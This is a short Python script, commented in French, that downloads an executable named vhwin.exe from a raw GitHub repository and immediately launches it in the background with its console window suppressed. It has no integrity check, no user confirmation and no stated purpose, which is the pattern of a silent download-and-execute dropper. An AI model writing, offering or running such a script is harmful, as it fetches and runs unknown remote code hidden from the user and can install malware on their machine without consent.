import os
import requests
import subprocess

def download_and_run_github_exe(file_url, target_dir):
    # Crée le dossier si besoin
    os.makedirs(target_dir, exist_ok=True)
    
    # Nom de fichier à partir de l'URL
    filename = os.path.basename(file_url)
    target_path = os.path.join(target_dir, filename)

    # Télécharger le fichier .exe
    response = requests.get(file_url, stream=True)
    if response.status_code == 200:
        with open(target_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=1024):
                if chunk:
                    f.write(chunk)
        print("Téléchargement réussi !")
    else:
        print("Erreur lors du téléchargement !")
        return  # Ne pas continuer si le fichier n'a pas été téléchargé

    # Lancer le programme en arrière-plan sans terminal (Windows)
    subprocess.Popen([target_path], creationflags=subprocess.CREATE_NO_WINDOW)
    print("Programme lancé.")

# Lien direct vers le fichier .exe (raw)
file_url = "https://raw.githubusercontent.com/Grutyh/ErrorAx-win/main/vhwin.exe"

# Dossier de destination
target_directory = "ax-win"

# Appel de la fonction
download_and_run_github_exe(file_url, target_directory)
